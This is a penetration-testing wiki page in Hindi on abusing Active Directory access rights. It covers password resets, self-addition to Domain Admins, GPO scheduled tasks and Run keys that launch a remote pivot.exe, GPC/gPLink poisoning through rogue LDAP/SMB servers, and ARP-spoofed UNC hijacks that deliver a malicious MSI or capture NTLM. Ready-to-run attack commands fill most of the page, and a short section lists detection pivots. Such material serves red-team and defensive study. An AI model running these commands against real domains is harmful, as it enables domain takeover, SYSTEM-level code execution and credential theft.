# Active Directory ACLs/ACEs का दुरुपयोग

{{#include ../../../banners/hacktricks-training.md}}

**यह पेज मुख्य रूप से इन तकनीकों का सारांश है:** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **और** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**। अधिक जानकारी के लिए, मूल लेख देखें।**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **User पर GenericAll अधिकार**

यह विशेषाधिकार हमलावर को किसी लक्षित user account पर पूरा नियंत्रण देता है। `Get-ObjectAcl` कमांड का उपयोग करके `GenericAll` अधिकारों की पुष्टि होने के बाद, हमलावर ये काम कर सकता है:

- **लक्ष्य का पासवर्ड बदलें**: `net user <username> <password> /domain` का उपयोग करके हमलावर user का पासवर्ड रीसेट कर सकता है।
- Linux से, Samba `net rpc` के ज़रिए SAMR पर भी यही किया जा सकता है:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **यदि account disabled है, तो UAC flag हटाएँ**: `GenericAll` से `userAccountControl` को edit किया जा सकता है। Linux से BloodyAD `ACCOUNTDISABLE` flag हटा सकता है:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: उपयोगकर्ता के खाते में SPN असाइन करें, ताकि उसे kerberoastable बनाया जा सके। फिर Rubeus और targetedKerberoast.py का उपयोग करके ticket-granting ticket (TGT) hashes निकालें और उन्हें crack करने का प्रयास करें।

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: user के लिए pre-authentication disable करें, जिससे उसका account ASREPRoasting के प्रति vulnerable हो जाता है।

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: किसी user पर `GenericAll` होने पर, आप certificate-based credential जोड़कर उसका password बदले बिना उसी के रूप में authenticate कर सकते हैं। देखें:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Group पर GenericAll अधिकार**

यह privilege attacker को group memberships में बदलाव करने की अनुमति देता है, यदि उसके पास `Domain Admins` जैसे group पर `GenericAll` अधिकार हों। `Get-NetGroup` से group का distinguished name पहचानने के बाद, attacker यह कर सकता है:

- **खुद को Domain Admins Group में जोड़ना**: यह सीधे commands के ज़रिए या Active Directory अथवा PowerSploit जैसे modules का उपयोग करके किया जा सकता है।

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Linux से आप उन arbitrary groups में खुद को जोड़ने के लिए BloodyAD का भी इस्तेमाल कर सकते हैं, जिनकी membership पर आपका GenericAll/Write अधिकार है। यदि target group “Remote Management Users” में nested है, तो उस group को मानने वाले hosts पर आपको तुरंत WinRM access मिल जाएगा:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Computer/User पर Write**

किसी computer object या user account पर ये privileges होने से निम्नलिखित संभव होता है:

- **Kerberos Resource-based Constrained Delegation**: computer object पर कब्ज़ा करने की सुविधा देता है।
- **Shadow Credentials**: shadow credentials बनाने के privileges का दुरुपयोग करके computer या user account का रूप धारण करने के लिए इस technique का उपयोग करें।

## **Group पर WriteProperty**

यदि किसी user के पास किसी विशिष्ट group (जैसे, `Domain Admins`) के सभी objects पर `WriteProperty` rights हैं, तो वह:

- **खुद को Domain Admins Group में जोड़ सकता है**: `net user` और `Add-NetGroupUser` commands को मिलाकर यह तरीका domain के भीतर privilege escalation की अनुमति देता है।

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Group पर Self (Self-Membership)**

यह privilege attackers को सीधे group membership में बदलाव करने वाले commands के ज़रिए खुद को `Domain Admins` जैसे विशिष्ट groups में जोड़ने की अनुमति देता है। निम्न command sequence का उपयोग करके वे खुद को group में जोड़ सकते हैं:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

एक समान privilege, यह attackers को समूहों की properties में बदलाव करके सीधे स्वयं को समूहों में जोड़ने देता है, यदि उनके पास उन समूहों पर `WriteProperty` अधिकार हो। इस privilege की पुष्टि और इसका इस्तेमाल इस प्रकार किया जाता है:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

किसी user पर `User-Force-Change-Password` के लिए `ExtendedRight` होने से वर्तमान password जाने बिना उसे reset किया जा सकता है। इस अधिकार की पुष्टि और इसका दुरुपयोग PowerShell या वैकल्पिक command-line tools के ज़रिए किया जा सकता है। इनमें interactive sessions और non-interactive environments के लिए one-liners सहित, user का password reset करने के कई तरीके शामिल हैं। Commands साधारण PowerShell invocations से लेकर Linux पर `rpcclient` के उपयोग तक होते हैं, जो attack vectors की विविधता दर्शाते हैं।

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **Group पर WriteOwner**

यदि किसी attacker को पता चलता है कि उसके पास किसी group पर `WriteOwner` अधिकार हैं, तो वह उस group का ownership बदलकर अपने नाम कर सकता है। यह खास तौर पर तब प्रभावशाली होता है, जब संबंधित group `Domain Admins` हो, क्योंकि ownership बदलने से group के attributes और membership पर व्यापक नियंत्रण मिलता है। इस प्रक्रिया में `Get-ObjectAcl` के ज़रिए सही object की पहचान करना और फिर SID या नाम के आधार पर owner को बदलने के लिए `Set-DomainObjectOwner` का उपयोग करना शामिल है।

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite on User**

यह permission attacker को user properties modify करने की अनुमति देती है। खास तौर पर, `GenericWrite` access के साथ attacker किसी user के logon script path को बदल सकता है, ताकि user के logon करते ही malicious script execute हो। इसके लिए `Set-ADObject` command का उपयोग करके target user की `scriptpath` property को attacker की script पर point करने के लिए update किया जाता है।

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

एक अधिक सीमित `WriteProperty` ACE, जो उपयोगकर्ता के [`scriptPath` attribute](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) तक सीमित हो, पर्याप्त हो सकता है; `GenericWrite` आवश्यक नहीं है। इस attribute permission को domain के `SYSVOL\<domain>\scripts` या `NETLOGON` tree में मौजूद writable script के साथ जोड़ें, फिर आकलन करें कि target user के लॉग ऑन करके उस script तक पहुँचने की संभावना कितनी है। लॉग ऑन होने पर script उस उपयोगकर्ता के context में चलती है। प्रभावी AD और file/share ACLs की अलग-अलग समीक्षा करें; केवल matching Allow ACE या writable directory से पूरी प्रक्रिया संभव होना साबित नहीं होता।

## **GenericWrite on Group**

इस privilege से attackers group membership में बदलाव कर सकते हैं, जैसे खुद को या अन्य users को खास groups में जोड़ना। इस प्रक्रिया में credential object बनाना, उसका उपयोग करके users को किसी group में जोड़ना या हटाना, और PowerShell commands से membership में हुए बदलावों की पुष्टि करना शामिल है।

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Linux से, यदि आपके पास group पर `GenericWrite` है, तो Samba `net` से members जोड़/हटा सकते हैं (जब PowerShell/RSAT उपलब्ध न हों, तब उपयोगी):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

AD object का मालिक होना और उस पर `WriteDACL` विशेषाधिकार होना, हमलावर को उस object पर `GenericAll` विशेषाधिकार देने में सक्षम बनाता है। यह ADSI में बदलाव करके किया जाता है, जिससे object पर पूरा नियंत्रण मिलता है और उसकी group memberships में बदलाव किया जा सकता है। इसके बावजूद, Active Directory module के `Set-Acl` / `Get-Acl` cmdlets का इस्तेमाल करके इन विशेषाधिकारों का फ़ायदा उठाने की कोशिश करते समय सीमाएँ मौजूद हैं।<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### WriteDACL/WriteOwner quick takeover (PowerView)

जब किसी user या service account पर आपके पास `WriteOwner` और `WriteDacl` हों, तो पुराने password को जाने बिना PowerView का उपयोग करके आप उस पर पूरा control हासिल कर सकते हैं और उसका password reset कर सकते हैं:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

नोट्स:
- अगर आपके पास केवल `WriteOwner` है, तो पहले आपको owner को अपने नाम पर बदलना पड़ सकता है:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Password reset के बाद किसी भी protocol (SMB/LDAP/RDP/WinRM) से access की पुष्टि करें।

## **Domain पर Replication (DCSync)**

DCSync attack domain पर विशेष replication permissions का लाभ उठाकर Domain Controller का रूप धारण करता है और user credentials सहित data को synchronize करता है। इस शक्तिशाली technique के लिए `DS-Replication-Get-Changes` जैसी permissions आवश्यक हैं। इनके ज़रिए attackers, Domain Controller तक सीधी पहुँच के बिना AD environment से संवेदनशील जानकारी निकाल सकते हैं।<sup>[[5]](#references)</sup> [**DCSync attack के बारे में यहाँ और जानें।**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Group Policy Objects (GPOs) को manage करने के लिए delegated access से सुरक्षा के गंभीर जोखिम पैदा हो सकते हैं। उदाहरण के लिए, यदि `offense\spotless` जैसे user को GPO management rights सौंपे गए हैं, तो उसके पास **WriteProperty**, **WriteDacl** और **WriteOwner** जैसे privileges हो सकते हैं। इन permissions का दुर्भावनापूर्ण उद्देश्यों के लिए दुरुपयोग किया जा सकता है। PowerView का उपयोग करके इनकी पहचान इस तरह की जा सकती है: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPO Permissions की गणना करें

गलत तरीके से configure किए गए GPOs की पहचान करने के लिए, PowerSploit के cmdlets को एक साथ chain किया जा सकता है। इससे उन GPOs का पता लगाया जा सकता है जिन्हें manage करने की permissions किसी विशेष user के पास हैं: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**लागू की गई किसी नीति वाले Computers**: यह पता लगाया जा सकता है कि कोई विशेष GPO किन computers पर लागू होता है, जिससे संभावित प्रभाव का दायरा समझने में मदद मिलती है। `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**किसी Computer पर लागू Policies**: किसी विशेष computer पर लागू policies देखने के लिए, `Get-DomainGPO` जैसे commands का उपयोग किया जा सकता है।

**लागू की गई किसी नीति वाले OUs**: किसी विशेष policy से प्रभावित organizational units (OUs) की पहचान `Get-DomainOU` का उपयोग करके की जा सकती है।

GPOs की गणना करने और उनमें समस्याएँ खोजने के लिए [**GPOHound**](https://github.com/cogiceo/GPOHound) tool का भी उपयोग किया जा सकता है।

### GPO का दुरुपयोग - New-GPOImmediateTask

गलत तरीके से configure किए गए GPOs का code execute करने के लिए दुरुपयोग किया जा सकता है। उदाहरण के लिए, एक immediate scheduled task बनाया जा सकता है। इससे प्रभावित machines पर किसी user को local administrators group में जोड़ा जा सकता है, जिससे उसके privileges काफ़ी बढ़ जाते हैं:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - GPO का दुरुपयोग

यदि GroupPolicy module इंस्टॉल है, तो यह नए GPO बनाने और उन्हें लिंक करने के साथ-साथ प्रभावित कंप्यूटरों पर backdoors चलाने के लिए registry values जैसी preferences सेट करने की अनुमति देता है। इस तरीके में GPO को अपडेट करना और execution के लिए किसी user का कंप्यूटर पर लॉग इन करना आवश्यक है:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse मौजूदा GPOs में tasks जोड़कर या settings संशोधित करके, नए GPOs बनाने की आवश्यकता के बिना, उनका दुरुपयोग करने का तरीका प्रदान करता है। इस tool के लिए बदलाव लागू करने से पहले मौजूदा GPOs को संशोधित करना या नए GPOs बनाने के लिए RSAT tools का उपयोग करना आवश्यक है:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Policy Update को Force करना

GPO अपडेट आमतौर पर हर 90 मिनट में होते हैं। इस प्रक्रिया को तेज़ करने के लिए, खासकर कोई बदलाव लागू करने के बाद, target computer पर `gpupdate /force` command का उपयोग करके तुरंत policy update force किया जा सकता है। यह command सुनिश्चित करती है कि GPOs में किए गए बदलाव अगले automatic update cycle का इंतज़ार किए बिना लागू हों।

### अंदरूनी कार्यप्रणाली

किसी GPO, जैसे `Misconfigured Policy`, के Scheduled Tasks की जाँच करने पर `evilTask` जैसे tasks जोड़े जाने की पुष्टि की जा सकती है। ये tasks scripts या command-line tools के ज़रिए बनाए जाते हैं, जिनका उद्देश्य system के व्यवहार में बदलाव करना या privileges बढ़ाना होता है।

`New-GPOImmediateTask` से जनरेट की गई XML configuration file में दिखाया गया task structure, scheduled task की जानकारी बताता है—जिसमें execute की जाने वाली command और उसके triggers शामिल हैं। यह file दिखाती है कि GPOs के भीतर scheduled tasks कैसे परिभाषित और प्रबंधित किए जाते हैं, और policy लागू करते समय arbitrary commands या scripts execute करने का तरीका प्रदान करती है।

### Users और Groups

GPOs target systems पर user और group memberships में बदलाव करने की भी अनुमति देते हैं। Users and Groups policy files को सीधे edit करके attackers users को privileged groups, जैसे स्थानीय `administrators` group, में जोड़ सकते हैं। यह GPO management permissions delegate करने से संभव होता है, जिससे policy files में नए users शामिल किए जा सकते हैं या group memberships बदली जा सकती हैं।

Users and Groups की XML configuration file बताती है कि ये बदलाव कैसे लागू किए जाते हैं। इस file में entries जोड़कर, प्रभावित systems पर specific users को elevated privileges दिए जा सकते हैं। यह तरीका GPO manipulation के ज़रिए privilege escalation का सीधा मार्ग प्रदान करता है।

Local group membership और user rights जैसी security settings के लिए, लागू GPO template `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` और `SecEdit` directory ACL की भी जाँच करें। किसी writable directory या file को जाँच का संकेत मानें: बदलाव प्रभावी हो सकता है या नहीं, यह effective SYSVOL share access, deny और inherited ACLs, Group Policy container permissions, policy scope और client refresh पर भी निर्भर करता है। केवल “GPO Managers” नाम के group की membership से edit rights साबित नहीं होते। [Microsoft इस template path और Group Policy container/template के अलग-अलग होने का विवरण देता है।](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

इसके अलावा, code execute करने या persistence बनाए रखने के अन्य तरीकों पर भी विचार किया जा सकता है, जैसे logon/logoff scripts का उपयोग, autoruns के लिए registry keys में बदलाव, .msi files के ज़रिए software install करना या service configurations edit करना। ये techniques GPOs का दुरुपयोग करके access बनाए रखने और target systems को नियंत्रित करने के विभिन्न रास्ते प्रदान करती हैं।

### GPC/GPT retrieval को authenticated rogue services की ओर redirect करना

एक GPO में metadata वाला LDAP **Group Policy Container (GPC)** और policy files वाला SMB-hosted **Group Policy Template (GPT)** शामिल होता है। Refresh के दौरान, client container के `gPLink` को follow करता है, संदर्भित GPC और उसका `gPCFileSysPath` पढ़ता है, फिर उस UNC path से GPT download करता है। इसलिए, GPC या किसी OU, Site अथवा Domain के `gPLink` पर write access को privileged policy processing में बदला जा सकता है।<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### GPOddity से `gPCFileSysPath` poisoning

यदि नियंत्रित principal target GPC में लिख सकता है (सीधे या **NTLM relay to LDAP** के ज़रिए), तो `gPCFileSysPath` को attacker के host किए गए UNC path से बदलें। [GPOddity](https://github.com/synacktiv/GPOddity) LDAP change को automate करता है और एक malicious GPT serve करता है, जिसमें module-based policy files या Immediate Task होता है, जिसे Group Policy client `NT AUTHORITY\SYSTEM` के रूप में execute करता है।<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Anonymous या credential-agnostic SMB share मौजूदा Windows clients पर पर्याप्त नहीं है: SMB Secure Negotiate के लिए इस बात का प्रमाण आवश्यक है कि authentication सफल हुआ था। इसलिए rogue service को domain identity validate करनी होगी, SMB session key derive करनी होगी और अपने responses पर सही ढंग से sign करना होगा। Embedded mode में, GPOddity को नियंत्रित machine account और उसकी service key के साथ configure करें, फिर `[COMMANDS]` section में computer- या user-side payload चुनें।<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**User GPO का विशेष मामला:** MS16-072 के बाद भी, Windows **एक ही TCP connection** में दो SMB2 sessions बनाता है: user session `GPT.INI` पढ़ता है, फिर computer-account session `ScheduledTasks.xml` जैसी प्रभावी configuration पढ़ता है। इसलिए rogue server को authentication state, session keys और signing keys को केवल socket के आधार पर नहीं, बल्कि SMB2 `SessionId` के आधार पर index करना होगा। GPOddity/OUned में embedded Scapy fork, `SMBStreamSocketMultiplexing` और multiplexing-aware `SMBServer` के ज़रिए इसे लागू करता है; single-session Impacket/Scapy servers अन्यथा गलत signing state दोबारा इस्तेमाल करते हैं और user policies पर विफल हो जाते हैं।<sup>[[15]](#references)</sup>

#### OUned के साथ `gPLink` poisoning

किसी OU, Site या Domain पर `WriteGPLink`, `GenericWrite` या समकक्ष नियंत्रण होने पर, attacker ऐसा link जोड़ सकता है जिसका GPC DN, attacker-controlled LDAP host द्वारा serve किया जाता है। यह primitive मूल रूप से Petros Koutroumpis ने प्रस्तुत किया था; [OUned](https://github.com/synacktiv/OUned) LDAP write और malicious GPC/GPT chain को automate करता है।<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

पीड़ित पहले rogue LDAP service से authenticate करता है और एक GPC प्राप्त करता है, जिसका `gPCFileSysPath` rogue SMB service की ओर इंगित करता है; फिर वह SMB से authenticate करता है और दिए गए GPT को लागू करता है। इसलिए OUned को LDAP SPN वाले account, SMB के लिए HOST SPN वाले machine account (एक ही machine account दोनों आवश्यकताएँ पूरी कर सकता है), और ऐसी DNS resolution या reverse forwarding की आवश्यकता होती है जो ports 389 और 445 को operator host पर भेजे।<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUned का embedded Scapy LDAP server, असली नियंत्रित service key के साथ Kerberos/SPNEGO को validate करता है और JSON से मनमाना GPC data serve करता है। खाली JSON key, rootDSE को दर्शाती है; `base64:` prefixes binary values दर्शाते हैं; और server, add/delete/modify/search तथा `BASE`, `LEVEL` और `SUBTREE` searches को support करता है। यह बिना protection, integrity या confidentiality के negotiation कर सकता है। इससे यह service तब दोबारा इस्तेमाल की जा सकती है, जब कोई दूसरा Windows component attacker-controlled LDAP reference को follow करे, लेकिन authenticated LDAP की मांग करे।<sup>[[15]](#references)</sup>

यह न मानें कि किसी account का password dummy domain में synchronize करने से हर Kerberos key दोबारा बन जाएगी: RC4, password से derive होता है, जबकि AES string-to-key में principal के hostname/domain से derive किया गया salt भी इस्तेमाल होता है। `KerberosSSP` को असली account AES key देने से, machine account के self-writable `msDS-SupportedEncryptionTypes` में ऐसा बदलाव करके RC4 को मजबूर करने की जरूरत नहीं पड़ती, जो आसानी से detect हो सकता है।<sup>[[15]](#references)</sup>

#### Detection pivots

`gPCFileSysPath` या `gPLink` में हुए बदलावों का मिलान GPO version changes और नए Immediate/Scheduled Task XML से करें। अनपेक्षित naming contexts के links, स्वीकृत DC/SYSVOL set से बाहर के UNC hosts, machine-account names को redirect करने वाले DNS records, असामान्य machine accounts के LDAP/CIFS service tickets, और RC4 को enable करने वाले `msDS-SupportedEncryptionTypes` बदलावों की जांच करें।<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

OU/domain पर `WriteGPLink` होने से आप target container का `gPLink` attribute बदल सकते हैं और GPO को खुद edit किए बिना **मौजूदा GPO को लागू होने के लिए मजबूर कर सकते हैं**। यह तब दिलचस्प हो जाता है, जब linked GPO पहले से **UNC paths** (`\\HOST\share\...`) के ज़रिए remote content reference करता हो, क्योंकि authenticated users **SYSVOL** पढ़ सकते हैं और reuse की जा सकने वाली policies को offline ढूंढ सकते हैं।<sup>[[11]](#references)</sup>

उच्च-स्तरीय workflow:

1. BloodHound का इस्तेमाल करके ऐसे principal की पहचान करें जिसके पास किसी OU पर `WriteGPLink` हो, और उस OU के भीतर computers/users की सूची बनाएं।
2. `SYSVOL` की read-only clone बनाएं और GPOs को parse करके ऐसे **Software Installation**, **drive mappings** (`Drives.xml`), और **logon/startup scripts** ढूंढें जो UNC paths को reference करते हों।
3. DFS/domain-namespace paths के बजाय **direct hostname** की ओर संकेत करने वाली policies को प्राथमिकता दें (उदाहरण के लिए `\\DC02\share\pkg.msi`), क्योंकि hostname-based paths को L2 spoofing से redirect करना आसान है।
4. चुने गए GPO GUID को target OU के `gPLink` में append करें, ताकि victim उस पहले से मौजूद policy को process करे।
5. उसी broadcast domain पर, UNC host को ARP spoof करें और उसका IP अपने host पर bind करें (`ip addr add <target_ip>/32 dev <iface>`), ताकि victim का SMB traffic आपके host तक पहुंचे।
6. अपेक्षित path/filename को attacker SMB server (उदाहरण के लिए `smbserver.py`) से serve करें और सामान्य policy processing का इंतज़ार करें।

उदाहरण: `SYSVOL` collection और GPO correlation:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

मौजूदा GPO को लक्षित OU से लिंक करें:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

यदि लिंक किया गया GPO किसी UNC path से MSI deploy करता है, तो client उसे **computer startup** के दौरान fetch करेगा और **`NT AUTHORITY\SYSTEM`** के रूप में install करेगा। संदर्भित host को spoof करके और **उसी share/path/name** के तहत malicious MSI serve करके, आप **SYSVOL में बदलाव किए बिना** `WriteGPLink` को SYSTEM code execution में बदल सकते हैं।

महत्वपूर्ण सीमाएँ:

- **समय मायने रखता है**: नया link policy refresh पर दिखता है (आमतौर पर ~90 मिनट), लेकिन **Software Installation** आमतौर पर **reboot** पर trigger होता है।
- Windows Installer आमतौर पर deployment को package के **`ProductCode`** से track करता है। यदि product पहले से install है, तो deployment छोड़ा जा सकता है।
- Installer द्वारा अस्वीकार किए जाने से बचने के लिए, rogue MSI को patch करें ताकि उसका **`ProductCode`** और **`PackageCode`**, GPO द्वारा अपेक्षित legitimate package से मेल खाएँ।
- पुरानी `.aas` advertisement files `SYSVOL` में बनी रह सकती हैं, इसलिए इस पर भरोसा करने से पहले जाँचें कि deployment अब भी active दिख रहा है।

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

`Drives.xml` में GPP drive mappings के कारण, लॉगऑन या दोबारा कनेक्ट होने के दौरान उपयोगकर्ता कॉन्फ़िगर किए गए UNC path से authenticate करते हैं। अगर आप संदर्भित host को spoof करते हैं, तो **NetNTLMv2** capture कर सकते हैं। अगर SMB को जानबूझकर fail कराया जाए, तो Windows **WebDAV** पर retry कर सकता है और **NTLM over HTTP** भेज सकता है, जिसे **LDAP(S)**, **AD CS**, या **SMB** पर relay करना कहीं अधिक आसान है।

#### Logon/startup script UNC hijack

यही तरीका `SYSVOL` में मिले UNC-hosted scripts पर भी लागू होता है:

- **Logon scripts** आमतौर पर **user** context में execute होते हैं।
- **Startup scripts** आमतौर पर **computer / SYSTEM** context में execute होते हैं।

अगर script path किसी spoof किए जा सकने वाले hostname की ओर point करता है, तो UNC host को redirect करें और अपेक्षित location से replacement script content serve करें।

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` या `\\<dc>\NETLOGON\` के अंतर्गत writable paths में बदलाव करके GPO के ज़रिए user logon के दौरान execute होने वाले logon scripts को tamper किया जा सकता है। इससे लॉगऑन करने वाले उपयोगकर्ताओं के security context में code execution मिलता है।

### Logon scripts ढूंढें
- कॉन्फ़िगर किए गए logon script के लिए user attributes देखें:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Scripts के shortcuts या references सामने लाने के लिए domain shares को crawl करें:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- `.lnk` files को parse करके SYSVOL/NETLOGON में मौजूद targets का पता लगाएँ (यह उपयोगी DFIR trick है और उन attackers के लिए भी, जिनके पास सीधे GPO access नहीं है):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound मौजूद होने पर user object का `scriptPath` logon-script attribute दिखाता है। GPO में कॉन्फ़िगर किए गए logon scripts अलग policy reference होते हैं, इसलिए लागू GPO का भी निरीक्षण करें।

### write access सत्यापित करें (share listings पर भरोसा न करें)
